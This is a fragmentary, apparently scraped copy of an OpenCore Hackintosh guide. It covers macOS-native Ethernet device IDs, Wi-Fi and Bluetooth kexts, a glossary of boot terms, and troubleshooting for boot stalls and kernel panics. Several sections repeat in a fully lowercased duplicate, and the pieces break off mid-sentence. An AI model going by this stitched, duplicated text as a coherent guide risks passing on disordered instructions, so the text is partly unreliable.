or newer\n\nand also keep in mind certain nics are actually natively supported in macos:\n\nnative ethernet controllers\n\n# aquantia series\n\n# appleethernetaquantiaaqtion.kext\npci1d6a,1    = aquantia aqc107\npci1d6a,d107 = aquantia aqc107\npci1d6a,7b1  = aquantia

aqc107\npci1d6a,c0   = aquantia aqc113\npci1d6a,4c0  = aquantia aqc113\n\n\nnote: due to some outdated firmware shipped on many aquantia nics, you may need to update the firmware in linux/windows to ensure it's macos-compatible.\n\n# intel series\n\n# appleintel8254xethernet.kext\npci8086,1096 = intel 80003es2lan\npci8086,100f = intel 82545em\npci8086,105e = intel 82571eb/82571gb\n\n#

any port limit issues\n   * features\n     * supports mapping from windows and macos (linux support in progress)\n     * can build a map using either the usbtoolbox kext or native apple kexts (appleusbhostmergeproperties)\n     * supports multiple ways of matching\n     * supports companion ports (on windows)\n\n * xhci-unsupported\n   \n   * needed for non-native usb controllers\n   * amd cpu based systems don't need this\n   * common chipsets needing this:\n     * h370\n     * b360\n     * h310\n     * z390 (not needed on mojave and newer)\n     * x79\n     * x99\n     * asrock intel boards (b460/z490+ boards do not need it however)\n\n\n# wifi and bluetooth\n\n# non-native bluetooth cards\n\n * bluetoolfixup\n   * patches the macos 12+ bluetooth stack to support third-party cards\n   * needed for all non-native (non-apple broadcom, intel, etc) bluetooth cards\n   * included in the brcmpatchram zip\n   * do not use on macos 11 and earlier\n\n# intel\n\n * airportitlwm\n   * adds support for a large variety of intel wireless cards and works natively in recovery thanks to io80211family integration\n   * requires macos 10.13 or newer and requires apple's secure boot to function correctly\n * itlwm\n   * alternative to airportitlwm for systems where apple's secure boot cannot be enabled\n   * requires heliport\n   * it will be treated as an ethernet card, and you will have to connect to wi-fi via heliport\n   * does not work in macos recovery\n * intelbluetoothfirmware\n   * adds bluetooth support to macos when paired with an intel wireless card\n   * use intelbtpatcher (included) in addition to patch bugs in macos\n   * requires macos 10.13 or newer\n   * on macos 10.13 through 11, you also need intelbluetoothinjector (included)\n\nmore info on enabling airportitlwm\n\nto enable airportitlwm support with opencore, you'll need to either:\n\n * enable misc -> security -> securebootmodel by either setting it as default or some other valid value\n   * this is discussed both later on in this guide and in the post-install guide: apple secure boot\n * if you cannot enable securebootmodel, you can still force inject io80211family (highly discouraged)\n   * set the following under kernel -> force in your config.plist (discussed later in this guide):\n\n\n\n# broadcom\n\n * airportbrcmfixup\n   * used for patching non-apple/non-fenvi broadcom cards, will not work on intel, killer, realtek, etc\n   * requires os x 10.10 or newer\n   * for big sur see big sur known issues for extra steps regarding airportbrcm4360 drivers.\n *

Linux is typically\n               packaged in a Linux distribution. Note that while macOS and\n               Linux may be UNIX-based, they're vastly different.\nDistros        Short for Distributions. Linux distros are how Linux is\n               distributed. However, when it comes to macOS, distros are\n               mixed macOS installers with a bunch of tools that are not\n               from Apple. Do not use macOS distros.\nHackintosh     The process of installing macOS onto a PC, note that\n               Hackintosh IS NOT the OS, it can also refer to the machine\n               that was \"hacked\" to get macOS running on it. EG: I\n               installed macOS on this Windows machine, therefore I have a\n               Hackintosh. But I did NOT install \"Hackintosh\".\nBootloader     Piece of software that loads an OS, usually made by the OS\n               creators. OpenCore is technically not a bootloader per se\n               (see boot manager explanation down below). Apple's Boot.efi\n               would be the actual boot loader in a Mac or Hackintosh.\nBoot Manager   Piece of software that manages bootloaders – we have many of\n               these: Clover, systemd-boot, OpenCore, rEFInd, rEFIt...\n               These are generally seen as prepping the system for the\n               actual boot loader.\n\n----------------------------------------\n\nTERM           DESCRIPTION\nOpenCore       The new hotness on the Hackintosh scene, made with security\n               in mind by the Acidanthera team, has faster booting and\n               lighter weight than Clover. It is a lot more work to set up\n               but also supports many things a lot more natively than\n               Clover (like Hibernation, FileVault 2, Boot HotKeys...).\nClover         A boot manager now considered legacy with the release of\n               OpenCore. This guide will not be covering uses of this\n               software.\nACPI           The Advanced Configuration and Power Interface (ACPI)\n               provides an open standard that operating systems can use to\n               discover and configure computer hardware components, more of\n               this will be discussed later in the guide.\nDSDT/SSDT      Tables in your ACPI that describe the devices and how the OS\n               should interact with them e.g. putting the computer to\n               sleep, wake, switching GPUs, USB ports.\n.AML           The compiled file format of ACPI, and what your PC will\n               execute. .DAT is another extension with the exact same use.\n.DSL           The source code for ACPI – this is what you edit and compile\n               for your computer. DO NOT mix this file format up with .ASL.\nKexts          Also known as Kernel Extensions, are macOS's drivers.\n               They're used to perform different tasks like device drivers\n               or for a different purpose (in Hackintoshing) like patching\n               the OS, injecting information or running tasks. Kexts are\n               not the only part of a good Hackintosh, as they're commonly\n               paired with ACPI patches and fixes.\nBIOS           The Basic Input/Output System is firmware used to perform\n               hardware initialization during the booting process (power-on\n               startup), and to provide runtime services for operating\n               systems and programs. The BIOS firmware comes preinstalled\n               on a personal computer's system board, and it is the first\n               software to run when powered on (source: Wikipedia). It's a\n               legacy piece of software that was made back in the 70s and\n               is still used to this day due to its maturity.\nUEFI           The Unified Extensible Firmware Interface (UEFI) is a\n               specification that defines a software interface between an\n               operating system and platform firmware. UEFI replaces the\n               legacy Basic Input/Output System (BIOS) firmware interface\n               originally present in all IBM PC-compatible personal\n               computers, with most UEFI firmware implementations providing\n               support for legacy BIOS services. UEFI can support remote\n               diagnostics and repair of computers, even with no operating\n               system installed. (source: Wikipedia)\nUEFI Drivers   Like any other OS, UEFI has drivers and they're loaded by\n               Clover or OpenCore. They're also meant to load devices or\n               perform other tasks, like loading Apple's HFS drives with\n               HfsPlus.efi, patching macOS's boot.efi and so on. You may\n               find them as Clover Drivers or OpenCore Drivers, they're all\n               UEFI drivers. (Note: only use drivers that are meant for\n               that specific boot manager. More info can be found on the\n               Clover Conversion page).\n\n----------------------------------------\n\nTERM   DESCRIPTION\nEFI    It can denote two things:\n       - Mac's firmware, which is the same as UEFI, but pretty\n       modified for Macs only, so not so \"Universal\"\n       - The partition on your hard drive that stores software read\n       by the UEFI to load OSes (like the Windows bootloader) or\n       UEFI Applications (like OpenCore), it's FAT32 formatted and\n       has an ID type of EF00 (in hex). It can be named ESP or\n       SYSTEM, and it's usually from 100MB to 400MB in size but the\n       size doesn't reflect upon anything.\nMBR    Master Boot Record is a special type of boot sector at the\n       very beginning of partitioned computer mass storage devices\n       like fixed disks or removable drives intended for use with\n       IBM PC-compatible systems and beyond. The MBR was first\n       introduced in 1983 with PC DOS 2.0. The MBR holds the\n       information on how the logical partitions, containing file\n       systems, are organized on that medium. The MBR also contains\n       executable code to function as a loader for the installed\n       operating system—usually by passing control over to the\n       loader's second stage, or in conjunction with each\n       partition's volume boot record (VBR). This MBR code is\n       usually referred to as a boot loader (source: Wikipedia).\n       This format is used on BIOS/Legacy setups. The MBR format\n       supports a maximum of 2 TiB of size and a max of 4 primary\n       partitions.\nGPT    GUID Partition Table (GPT) is a standard for the layout of\n       partition tables of a physical computer storage device, such\n       as a hard disk drive or solid-state drive, using universally\n       unique identifiers, which are also known as globally unique\n       identifiers (GUIDs). Forming a part of the Unified\n       Extensible Firmware Interface (UEFI) standard (Unified EFI\n       Forum-proposed replacement for the PC BIOS), it is\n       nevertheless also used for some BIOS systems, because of the\n       limitations of master boot record (MBR) partition tables,\n       which use 32 bits for logical block addressing (LBA) of\n       traditional 512-byte disk sectors (source: Wikipedia).\n       Usually, this is the disk format you want to use on a UEFI\n       system.\n\n----------------------------------------\n\nTERM        DESCRIPTION\nEC          Embedded Controller.

manager explanation down below). apple's boot.efi\n               would be the actual boot loader in a mac or hackintosh.\nboot manager   piece of software that manages bootloaders – we have many of\n               these: clover, systemd-boot, opencore, refind, refit...\n               these are generally seen as prepping the system for the\n               actual boot loader.\n\n----------------------------------------\n\nterm           description\nopencore       the new hotness on the hackintosh scene, made with security\n               in mind by the acidanthera team, has faster booting and\n               lighter weight than clover. it is a lot more work to set up\n               but also supports many things a lot more natively than\n               clover (like hibernation, filevault 2, boot hotkeys...).\nclover         a boot manager now considered legacy with the release of\n               opencore. this guide will not be covering uses of this\n               software.\nacpi           the advanced configuration and power interface (acpi)\n               provides an open standard that operating systems can use to\n               discover and configure computer hardware components, more of\n               this will be discussed later in the guide.\ndsdt/ssdt      tables in your acpi that describe the devices and how the os\n               should interact with them e.g. putting the computer to\n               sleep, wake, switching gpus, usb ports.\n.aml           the compiled file format of acpi, and what your pc will\n               execute. .dat is another extension with the exact same use.\n.dsl           the source code for acpi – this is what you edit and compile\n               for your computer. do not mix this file format up with .asl.\nkexts          also known as kernel extensions, are macos's drivers.\n               they're used to perform different tasks like device drivers\n               or for a different purpose (in hackintoshing) like patching\n               the os, injecting information or running tasks. kexts are\n               not the only part of a good hackintosh, as they're commonly\n               paired with acpi patches and fixes.\nbios           the basic input/output system is firmware used to perform\n               hardware initialization during the booting process (power-on\n               startup), and to provide runtime services for operating\n               systems and programs. the bios firmware comes preinstalled\n               on a personal computer's system board, and it is the first\n               software to run when powered on (source: wikipedia). it's a\n               legacy piece of software that was made back in the 70s and\n               is still used to this day due to its maturity.\nuefi           the unified extensible firmware interface (uefi) is a\n               specification that defines a software interface between an\n               operating system and platform firmware. uefi replaces the\n               legacy basic input/output system (bios) firmware interface\n               originally present in all ibm pc-compatible personal\n               computers, with most uefi firmware implementations providing\n               support for legacy bios services. uefi can support remote\n               diagnostics and repair of computers, even with no operating\n               system installed. (source: wikipedia)\nuefi drivers   like any other os, uefi has drivers and they're loaded by\n               clover or opencore. they're also meant to load devices or\n               perform other tasks, like loading apple's hfs drives with\n               hfsplus.efi, patching macos's boot.efi and so on. you may\n               find them as clover drivers or opencore drivers, they're all\n               uefi drivers. (note: only use drivers that are meant for\n               that specific boot manager. more info can be found on the\n               clover conversion page).\n\n----------------------------------------\n\nterm   description\nefi    it can denote two things:\n       - mac's firmware, which is the same as uefi, but pretty\n       modified for macs only, so not so \"universal\"\n       - the partition on your hard drive that stores software read\n       by the uefi to load oses (like the windows bootloader) or\n       uefi applications (like opencore), it's fat32 formatted and\n       has an id type of ef00 (in hex). it can be named esp or\n       system, and it's usually from 100mb to 400mb in size but the\n       size doesn't reflect upon anything.\nmbr    master boot record is a special type of boot sector at the\n       very beginning of partitioned computer mass storage devices\n       like fixed disks or removable drives intended for use with\n       ibm pc-compatible systems and beyond. the mbr was first\n       introduced in 1983 with pc dos 2.0. the mbr holds the\n       information on how the logical partitions, containing file\n       systems, are organized on that medium. the mbr also contains\n       executable code to function as a loader for the installed\n       operating system—usually by passing control over to the\n       loader's second stage, or in conjunction with each\n       partition's volume boot record (vbr). this mbr code is\n       usually referred to as a boot loader (source: wikipedia).\n       this format is used on bios/legacy setups. the mbr format\n       supports a maximum of 2 tib of size and a max of 4 primary\n       partitions.\ngpt    guid partition table (gpt) is a standard for the layout of\n       partition tables of a physical computer storage device, such\n       as a hard disk drive or solid-state drive, using universally\n       unique identifiers, which are also known as globally unique\n       identifiers (guids). forming a part of the unified\n       extensible firmware interface (uefi) standard (unified efi\n       forum-proposed replacement for the pc bios), it is\n       nevertheless also used for some bios systems, because of the\n       limitations of master boot record (mbr) partition tables,\n       which use 32 bits for logical block addressing (lba) of\n       traditional 512-byte disk sectors (source: wikipedia).\n       usually, this is the disk format you want to use on a uefi\n       system.\n\n----------------------------------------\n\nterm        description\nec          embedded controller. communicates between the main board and\n            embedded peripherals such as

The best way to diagnose it is via OpenCore's DEBUG Build and checking the logs whether OpenCore actually loaded, and if so what is it getting stuck on.\n\nSituations where OpenCore did not load:\n\n * If there are no logs present even after setting up the DEBUG version of OpenCore with Target set to 67, there's likely an issue either with:\n   * Incorrect USB Folder Structure\n     * See Booting OpenCore reboots to BIOS for more info\n   * Firmware does not support UEFI\n     * You'll need to setup DuetPkg, this is covered in both the macOS and Windows install pages\n\nSituations where OpenCore did load:\n\n * Check the last line printed in your logs, there will likely be either a .efi driver that's been loaded or some form of ASSERT\n   * For ASSERT's, you'll want to actually inform the developers about this issue here: Acidanthera's Bugtracker\n   * For .efi drivers getting stuck, check over the following:\n     * HfsPlus.efi load issues:\n       * Try using HfsPlusLegacy.efi instead\n       * This is recommended for CPUs that do not support RDRAND, mainly relevant for 3rd gen Ivy bridge i3 and older\n       * VBoxHfs.efi is another option however is much slower than HfsPlus's version\n     * HiiDatabase.efi load issues:\n       * Likely your firmware already supports HiiDatabase, so the driver is conflicting. Simply remove the driver as you don't need it.\n\n\n# Stuck on no vault provided!\n\nTurn off Vaulting in your config.plist under Misc -> Security -> Vault by setting it to:\n\n * Optional\n\nIf you have already executed the sign.command you will need to restore the OpenCore.efi file as the 256 byte RSA-2048 signature has been shoved in. Can grab a new copy of OpenCore.efi here: OpenCorePkg\n\nNote: Vault and FileVault are 2 separate things, see Security and FileVault for more details\n\n\n# Stuck on OC: Invalid Vault mode\n\nThis is likely a spelling mistake, options in OpenCore are case-sensitive so make sure you check closely, Optional is the correct way to enter it under Misc -> Security -> Vault\n\n\n# Can't see macOS partitions\n\nMain things to check:\n\n * ScanPolicy set to 0 to show all drives\n * Have the proper firmware drivers such as HfsPlus(Note ApfsDriverLoader shouldn't be used in 0.5.8)\n * Set UnblockFsConnect to True in config.plist -> UEFI -> Quirks. Needed for some HP systems\n * Set SATA Mode: AHCI in BIOS\n * Set UEFI -> APFS to see APFS based drives:\n   * EnableJumpstart: YES\n   * HideVerbose: NO\n   * If running older versions of High Sierra(ie. 10.13.5 or older), set the following:\n     * MinDate: -1\n     * MinVersion: -1\n\n\n# Stuck on OCB: OcScanForBootEntries failure - Not Found\n\nThis is due to OpenCore being unable to find any drives with the current ScanPolicy, setting to 0 will allow all boot options to be shown\n\n * Misc -> Security -> ScanPolicy -> 0\n\n\n# Stuck on OCB: failed to match a default boot option\n\nSame fix as OCB: OcScanForBootEntries failure - Not Found, OpenCore is unable to find any drives with the current ScanPolicy, setting to 0 will allow all boot options to be shown\n\n * Misc -> Security -> ScanPolicy -> 0\n\n\n# Stuck on OCB: System has no boot entries\n\nSame fix as the above 2:\n\n * Misc -> Security -> ScanPolicy -> 0\n\n\n# Stuck on OCS: No schema for DSDT, KernelAndKextPatch, RtVariable, SMBIOS, SystemParameters...\n\nThis is due to either using a Clover config with OpenCore or using a configurator such as Mackie's Clover and OpenCore configurator. You'll need to start over and make a new config or figure out all the garbage you need to remove from your config. This is why we don't support configurators, they are known for these issues\n\n * Note: These same issues will also occur if you mix outdated configs with newer versions of OpenCore. Please update them accordingly\n\n\n# Stuck on OC: Driver XXX.efi at 0 cannot be found\n\nThis is due to an entry being in your config.plist, however not present in your EFI. To resolve:\n\n * Ensure your EFI/OC/Drivers matches up with your config.plist -> UEFI -> Drivers\n   * If not, please run Cmd/Ctrl+R with OpenCore to re-snapshot your config.plist\n\nNote that the entries are case-sensitive.\n\n\n# Receiving \"Failed to parse real field of type 1\"\n\nThis is due to a value set as real when it's not supposed to be, generally being that Xcode converted HaltLevel by accident:\n\n<key>HaltLevel</key>\n <real>2147483648</real>\n\n\nTo fix, swap real for integer:\n\n<key>HaltLevel</key>\n <integer>2147483648</integer>\n\n\n\n# Can't select anything in the picker\n\nThis is due to either a few things\n\n * Incompatible keyboard driver:\n   \n   * Disable PollAppleHotKeys and enable KeySupport, then remove OpenUsbKbDxe from your config.plist -> UEFI -> Drivers\n   * If the above doesn't work, reverse: disable KeySupport, then add OpenUsbKbDxe to your config.plist -> UEFI -> Drivers\n\n * Missing PS2 keyboard driver(Ignore if using a USB keyboard):\n   \n   * While most firmwares will include it by default, some laptops and older PCs may still need Ps2KeyboardDxe.efi to function correctly. Remember to add this to your config.plist as well\n\n\n# SSDTs not being added\n\nSo with OpenCore, there's some extra security checks added around ACPI files, specifically that table length header must equal to the file size. This is actually the fault of iASL when you compiled the file. Example of how to find it:\n\n* Original Table Header:\n*     Signature        \"SSDT\"\n*     Length           0x0000015D (349)\n*     Revision         0x02\n*     Checksum         0xCF\n*     OEM ID           \"ACDT\"\n*     OEM Table ID     \"SsdtEC\"\n*     OEM Revision     0x00001000 (4096)\n*     Compiler ID      \"INTL\"\n*     Compiler Version 0x20190509 (538510601)\n\n\nThe Length and checksum value is what we care about, so if our SSDT is actually 347 bytes then we want to change Length to 0x0000015B (347)(the 015B is in HEX)\n\nBest way to actually fix this is to grab a newer copy of iASL or Acidanthera's copy of MaciASL and remaking the SSDT\n\n * Note: MaciASL distributed by Rehabman are prone to ACPI corruption, please avoid it as they no longer maintain their repos\n\n\n# Booting OpenCore reboots to BIOS\n\n * Incorrect EFI folder structure, make sure all of your OC files are within an EFI folder located on your ESP(EFI system partition)\n\nExample of folder structure\n\n\n\n\n# OCABC: Incompatible OpenRuntime r4, require r10\n\nOutdated OpenRuntime.efi, make sure BOOTx64.efi, OpenCore.efi and OpenRuntime are all from the same exact build. Anything mismatched will break booting\n\n * Note: FwRuntimeServices has been renamed to OpenRuntime with 0.5.7 and newer\n\n\n# Failed to open OpenCore image - Access Denied\n\nOn newer Microsoft Surface device firmwares, loading OpenCore will now result in a security violation even when Secure Boot is disabled. To resolve this, enable UEFI -> Quirks -> DisableSecurityPolicy in your config.plist. See here for more info: Failed to open OpenCore image - Access Denied #1446\n\n\n# OC: Failed to find SB model disable halting on critical error\n\nThis is a typo, ensure that in your config.plist Misc -> Security -> SecureBootModel is set to Disabled\n\n\n# Legacy boot stuck on BOOT FAIL!\n\nThis error means that EFI/OC/OpenCore.efi could not be found on any partition.

specifically it's having troubles loading all the drivers and presenting the menu. the best way to diagnose it is via opencore's debug build and checking the logs whether opencore actually loaded, and if so what is it getting stuck on.\n\nsituations where opencore did not load:\n\n * if there are no logs present even after setting up the debug version of opencore with target set to 67, there's likely an issue either with:\n   * incorrect usb folder structure\n     * see booting opencore reboots to bios for more info\n   * firmware does not support uefi\n     * you'll need to setup duetpkg, this is covered in both the macos and windows install pages\n\nsituations where opencore did load:\n\n * check the last line printed in your logs, there will likely be either a .efi driver that's been loaded or some form of assert\n   * for assert's, you'll want to actually inform the developers about this issue here: acidanthera's bugtracker\n   * for .efi drivers getting stuck, check over the following:\n     * hfsplus.efi load issues:\n       * try using hfspluslegacy.efi instead\n       * this is recommended for cpus that do not support rdrand, mainly relevant for 3rd gen ivy bridge i3 and older\n       * vboxhfs.efi is another option however is much slower than hfsplus's version\n     * hiidatabase.efi load issues:\n       * likely your firmware already supports hiidatabase, so the driver is conflicting. simply remove the driver as you don't need it.\n\n\n# stuck on no vault provided!\n\nturn off vaulting in your config.plist under misc -> security -> vault by setting it to:\n\n * optional\n\nif you have already executed the sign.command you will need to restore the opencore.efi file as the 256 byte rsa-2048 signature has been shoved in. can grab a new copy of opencore.efi here: opencorepkg\n\nnote: vault and filevault are 2 separate things, see security and filevault for more details\n\n\n# stuck on oc: invalid vault mode\n\nthis is likely a spelling mistake, options in opencore are case-sensitive so make sure you check closely, optional is the correct way to enter it under misc -> security -> vault\n\n\n# can't see macos partitions\n\nmain things to check:\n\n * scanpolicy set to 0 to show all drives\n * have the proper firmware drivers such as hfsplus(note apfsdriverloader shouldn't be used in 0.5.8)\n * set unblockfsconnect to true in config.plist -> uefi -> quirks. needed for some hp systems\n * set sata mode: ahci in bios\n * set uefi -> apfs to see apfs based drives:\n   * enablejumpstart: yes\n   * hideverbose: no\n   * if running older versions of high sierra(ie. 10.13.5 or older), set the following:\n     * mindate: -1\n     * minversion: -1\n\n\n# stuck on ocb: ocscanforbootentries failure - not found\n\nthis is due to opencore being unable to find any drives with the current scanpolicy, setting to 0 will allow all boot options to be shown\n\n * misc -> security -> scanpolicy -> 0\n\n\n# stuck on ocb: failed to match a default boot option\n\nsame fix as ocb: ocscanforbootentries failure - not found, opencore is unable to find any drives with the current scanpolicy, setting to 0 will allow all boot options to be shown\n\n * misc -> security -> scanpolicy -> 0\n\n\n# stuck on ocb: system has no boot entries\n\nsame fix as the above 2:\n\n * misc -> security -> scanpolicy -> 0\n\n\n# stuck on ocs: no schema for dsdt, kernelandkextpatch, rtvariable, smbios, systemparameters...\n\nthis is due to either using a clover config with opencore or using a configurator such as mackie's clover and opencore configurator. you'll need to start over and make a new config or figure out all the garbage you need to remove from your config. this is why we don't support configurators, they are known for these issues\n\n * note: these same issues will also occur if you mix outdated configs with newer versions of opencore. please update them accordingly\n\n\n# stuck on oc: driver xxx.efi at 0 cannot be found\n\nthis is due to an entry being in your config.plist, however not present in your efi. to resolve:\n\n * ensure your efi/oc/drivers matches up with your config.plist -> uefi -> drivers\n   * if not, please run cmd/ctrl+r with opencore to re-snapshot your config.plist\n\nnote that the entries are case-sensitive.\n\n\n# receiving \"failed to parse real field of type 1\"\n\nthis is due to a value set as real when it's not supposed to be, generally being that xcode converted haltlevel by accident:\n\n<key>haltlevel</key>\n <real>2147483648</real>\n\n\nto fix, swap real for integer:\n\n<key>haltlevel</key>\n <integer>2147483648</integer>\n\n\n\n# can't select anything in the picker\n\nthis is due to either a few things\n\n * incompatible keyboard driver:\n   \n   * disable pollapplehotkeys and enable keysupport, then remove openusbkbdxe from your config.plist -> uefi -> drivers\n   * if the above doesn't work, reverse: disable keysupport, then add openusbkbdxe to your config.plist -> uefi -> drivers\n\n * missing ps2 keyboard driver(ignore if using a usb keyboard):\n   \n   * while most firmwares will include it by default, some laptops and older pcs may still need ps2keyboarddxe.efi to function correctly. remember to add this to your config.plist as well\n\n\n# ssdts not being added\n\nso with opencore, there's some extra security checks added around acpi files, specifically that table length header must equal to the file size. this is actually the fault of iasl when you compiled the file. example of how to find it:\n\n* original table header:\n*     signature        \"ssdt\"\n*     length           0x0000015d (349)\n*     revision         0x02\n*     checksum         0xcf\n*     oem id           \"acdt\"\n*     oem table id     \"ssdtec\"\n*     oem revision     0x00001000 (4096)\n*     compiler id      \"intl\"\n*     compiler version 0x20190509 (538510601)\n\n\nthe length and checksum value is what we care about, so if our ssdt is actually 347 bytes then we want to change length to 0x0000015b (347)(the 015b is in hex)\n\nbest way to actually fix this is to grab a newer copy of iasl or acidanthera's copy of maciasl and remaking the ssdt\n\n * note: maciasl distributed by rehabman are prone to acpi corruption, please avoid it as they no longer maintain their repos\n\n\n# booting opencore reboots to bios\n\n * incorrect efi folder structure, make sure all of your oc files are within an efi folder located on your esp(efi system partition)\n\nexample of folder structure\n\n\n\n\n# ocabc: incompatible openruntime r4, require r10\n\noutdated openruntime.efi, make sure bootx64.efi, opencore.efi and openruntime are all from the same exact build. anything mismatched will break booting\n\n * note: fwruntimeservices has been renamed to openruntime with 0.5.7 and newer\n\n\n# failed to open opencore image - access denied\n\non newer microsoft surface device firmwares, loading opencore will now result in a security violation even when secure boot is disabled. to resolve this, enable uefi -> quirks -> disablesecuritypolicy in your config.plist. see here for more info: failed to open opencore image - access denied #1446\n\n\n# oc: failed to find sb model disable halting on critical error\n\nthis is a typo, ensure that in your config.plist misc -> security -> securebootmodel is set to disabled\n\n\n# legacy boot

More info here: Using DevirtualiseMmio\n   * For TRx40 users, enable this quirk\n   * For X99 users, disable this quirk as it breaks with some firmwares\n\n * SetupVirtualMap\n   \n   * This quirk is required for the majority of firmwares and without it it's very common to kernel panic here, so enable it if not already\n     * Mainly Z390 and older require this quirk enabled\n     * However, certain firmwares(mainly 2020+) do not work with this quirk and so may actually cause this kernel panic:\n       * Intel's Ice Lake series\n       * Intel's Comet Lake series(B460, H470, Z490, etc)\n       * AMD's B550 and A520(Latest BIOS on X570 are also included now)\n         * Many B450 and X470 boards with late 2020 BIOS updates are also included\n       * AMD's TRx40\n       * VMs like QEMU\n       * X299 2020+ BIOS updates(This applies to other X299 boards on the latest BIOS that released either in late 2019 or 2020+)\n\n * EnableWriteUnprotector\n   \n   * Another issue may be that macOS is conflicting with the write protection from CR0 register, to resolve this we have 2 options:\n     * If your firmware supports MATs(2018+ firmwares):\n       * EnableWriteUnprotector -> False\n       * RebuildAppleMemoryMap -> True\n       * SyncRuntimePermissions -> True\n     * For older firmwares:\n       * EnableWriteUnprotector -> True\n       * RebuildAppleMemoryMap -> False\n       * SyncRuntimePermissions -> False\n     * Note: Some laptops(ex. Dell Inspiron 5370) even with MATs support will halt on boot up, in these cases you'll have two options:\n       * Boot with the old firmware quirk combo(ie. With EnableWriteUnprotector and disable RebuildAppleMemoryMap + SyncRuntimePermissions)\n       * Enable DevirtualiseMmio and follow MmioWhitelist guide\n\nRegarding MATs support, firmwares built against EDK 2018 will support this and many OEMs have even added support all the way back to Skylake laptops. Issue is it's not always obvious if an OEM has updated the firmware, you can check the OpenCore logs whether yours supports it(See here how to get a log):\n\nOCABC: MAT support is 1\n\n\n * Note: 1 means it supports MATs, while 0 means it does not.\n\n\n# Kernel Patch Issues\n\nThis section will be split between Intel and AMD users:\n\n# AMD Users\n\n * Missing kernel patches(only applies for AMD CPUs, make sure they're OpenCore patches and not Clover. Clover uses MatchOS while OpenCore has MinKernel and Maxkernel)\n   * Note outdated kernel patches will also have the same effect please ensure you're using the latest patches from AMD OS X\n\n# Intel Users\n\n * AppleXcpmCfgLock and AppleCpuPmCfgLock\n   * Missing CFG or XCPM patches, please enable AppleXcpmCfgLock and AppleCpuPmCfgLock\n     * Haswell and newer only need AppleXcpmCfgLock\n     * Ivy Bridge and older only need AppleCpuPmCfgLock\n       * Broadwell and older need AppleCpuPmCfgLock if running 10.10 or older\n   * Alternatively you can properly disable CFG-Lock: Fixing CFG Lock\n * AppleXcpmExtraMsrs\n   * May also be required, this is generally meant for Pentiums, HEDT and other odd systems not natively supported in macOS.\n\n# Legacy Intel users\n\nFor macOS Big Sur, many firmwares have issues determining the CPU core count and thus will kernel panic too early for screen printing. Via serial, you can see the following panic:\n\nmax_cpus_from_firmware not yet initialized\n\n\nTo resolve:\n\n * Enable AvoidRuntimeDefrag under Booter -> Quirks\n   * This should work for most firmwares\n\nHowever on certain machines like the HP Compaq DC 7900, the firmware will still panic so we need to force a CPU core count value. Only use the below patch if AvoidRuntimeDefrag didn't work:\n\nLegacy CPU Core patch\n\nTo do this, Add the following patch(replacing the 04 from B8 04 00 00 00 C3 with the amount of CPU threads your hardware supports):\n\nKEY           TYPE      VALUE\nBase          String    _acpi_count_enabled_logical_processors\nCount         Integer   1\nEnabled       Boolean   True\nFind          Data      \nIdentifier    String    Kernel\nLimit         Integer   0\nMask          Data      \nMaxKernel     String    \nMinKernel     String    20.0.0\nReplace       Data      B804000000C3\nReplaceMask   Data      \nSkip          Integer   0\n\n\n# UEFI Issues\n\n * ProvideConsoleGop\n   * Needed for transitioning to the next screen, this was originally part of AptioMemoryFix but is now within OpenCore as this quirk. Can be found under UEFI -> Output\n   * Note as of 0.5.6, this quirk is enabled by default in the sample.plist\n * IgnoreInvalidFlexRatio\n   * This is needed for Broadwell and older.

After downloading the older patches linked above, merge them into your config.plist (making sure to remove the old patches first).\n\nAn example:\n\n\n\n\n# Kernel Panic on Invalid frame pointer\n\nSo this is due to some issue around the Booter -> Quirks you set, main things to check for:\n\n * DevirtualiseMmio\n   \n   * Certain MMIO spaces are still required to function correctly, so you'll need to either exclude these regions in Booter -> MmioWhitelist or disable this quirk outright\n   * More info here: Using DevirtualiseMmio\n\n * SetupVirtualMap\n   \n   * This quirk is required for the majority of firmwares and without it it's very common to kernel panic here, so enable it if not already\n     * However, certain firmwares do not work with this quirk and so may actually cause this kernel panic:\n       * Intel's Ice Lake series\n       * Intel's Comet Lake series\n       * AMD's B550\n       * AMD's A520\n       * AMD's TRx40\n       * VMs like QEMU\n\nAnother issue may be that macOS is conflicting with the write protection from CR0 register, to resolve this we have 2 options:\n\n * If your firmware supports MATs(2018+ firmwares):\n   * EnableWriteUnprotector -> False\n   * RebuildAppleMemoryMap -> True\n   * SyncRuntimePermissions -> True\n * For older firmwares:\n   * EnableWriteUnprotector -> True\n   * RebuildAppleMemoryMap -> False\n   * SyncRuntimePermissions -> False\n\nRegarding MATs support, firmwares built against EDK 2018 will support this and many OEMs have even added support all the way back to Skylake laptops.

Other names include:\n\n * apfs_module_start...,\n * Waiting for Root device,\n * Waiting on...IOResources...,\n * previous shutdown cause...\n\nThe main places to check:\n\n * Missing EC patch:\n   \n   * Make sure you have your EC SSDT both in EFI/OC/ACPI and ACPI -> Add, double check it's enabled.\n   * If you don't have one, grab it here: Getting started with ACPI\n\n * IRQ conflict:\n   \n   * Most common on older laptops and pre-builts, run SSDTTime's FixHPET option and add the resulting SSDT-HPET.aml and ACPI patches to your config( the SSDT will not work without the ACPI patches)\n\n * PCI allocation issue:\n   \n   * UPDATE YOUR BIOS, make sure it's on the latest. Most OEMs have very broken PCI allocation on older firmwares, especially AMD\n   * Make sure either Above4G is enabled in the BIOS, if no option available then add npci=0x2000 or npci=0x3000 (try both one at a time) to boot args.\n     * Some X99 and X299 boards(ie. GA-X299-UD4) may require both npci boot-arg and Above4G enabled\n     * AMD CPU Note: Do not have both the Above4G setting enabled and npci in boot args, they will conflict\n     * 2020+ BIOS Notes: When enabling Above4G, Resizable BAR Support may become an available. Please ensure that Booter -> Quirks -> ResizeAppleGpuBars is set to 0 if this is enabled.\n   * Other BIOS settings that are important: CSM disabled, Windows 8.1/10 UEFI Mode enabled\n\n * NVMe or SATA issue:\n   \n   * Sometimes if either a bad SATA controller or an unsupported NVMe drive are used, you can commonly get stuck here. Things you can check:\n     * Not using either a Samsung PM981 or Micron 2200S NVMe SSD\n     * Samsung 970 EVO Plus running the latest firmware(older firmwares were known for instability and stalls, see here for more info)\n     * SATA Hot-Plug is disabled in the BIOS(more commonly to cause issues on AMD CPU based systems)\n     * Ensure NVMe drives are set as NVMe mode in BIOS(some BIOS have a bug where you can set NVMe drives as SATA)\n\n * NVRAM Failing:\n   \n   * Common issue HEDT and 300 series motherboards, you have a couple paths to go down:\n     * 300 Series Consumer Intel: See Getting started with ACPI on making SSDT-PMC.aml\n     * HEDT(ie. X99): See Emulating NVRAM on how to stop NVRAM write, note that for install you do not need to run the script. Just setup the config.plist\n\n * RTC Missing:\n   \n   * Commonly found on Intel's 300+ 